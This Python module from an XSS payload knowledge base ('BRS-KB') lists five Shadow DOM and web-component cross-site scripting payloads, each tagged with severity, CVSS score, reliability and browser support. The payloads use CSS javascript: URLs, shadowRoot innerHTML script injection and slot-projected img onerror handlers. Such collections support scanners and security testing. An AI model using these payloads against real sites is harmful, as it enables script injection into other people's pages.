#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Shadow DOM Piercing & Encapsulation Breakouts
"""

from ..models import PayloadEntry

SHADOW_PIERCING_PAYLOADS = {
    "shadow_pierce_host_context": PayloadEntry(
        payload=":host-context(div) { background-image: url('javascript:alert(1)') }",
        contexts=["css", "shadow_dom"],
        severity="medium",
        cvss_score=6.1,
        description="CSS :host-context selector abuse (rare)",
        tags=["shadow-dom", "css", "piercing"],
        reliability="low",
        browser_support=["chrome"]
    ),
    "shadow_deep_selector": PayloadEntry(
        payload="body /deep/ img { behavior: url(xss.htc); }",
        contexts=["css", "shadow_dom"],
        severity="high",
        cvss_score=7.5,
        description="Legacy /deep/ combinator abuse",
        tags=["shadow-dom", "css", "legacy", "deep"],
        reliability="low",
        browser_support=["chrome < 63"]
    ),
    "shadow_open_access": PayloadEntry(
        payload="document.querySelector('my-element').shadowRoot.innerHTML='<script>alert(1)</script>'",
        contexts=["javascript", "console"],
        severity="high",
        cvss_score=8.0,
        description="Accessing open Shadow Root to inject script",
        tags=["shadow-dom", "javascript", "open-mode"],
        reliability="high",
        browser_support=["all"]
    ),
    "shadow_slot_injection": PayloadEntry(
        payload="<span slot='my-slot'><img src=x onerror=alert(1)></span>",
        contexts=["html_content", "shadow_dom", "web_components"],
        severity="high",
        cvss_score=7.5,
        description="XSS via Web Component slot projection",
        tags=["shadow-dom", "slot", "projection"],
        reliability="high",
        browser_support=["all"]
    ),
    "shadow_part_attribute": PayloadEntry(
        payload="::part(foo) { animation-name: xss; } @keyframes xss { from { background-image: url('javascript:alert(1)'); } }",
        contexts=["css", "shadow_dom"],
        severity="medium",
        cvss_score=6.5,
        description="CSS Shadow Parts animation vector",
        tags=["shadow-dom", "css-parts", "animation"],
        reliability="medium",
        browser_support=["chrome", "firefox"]
    )
}

SHADOW_PIERCING_TOTAL = len(SHADOW_PIERCING_PAYLOADS)
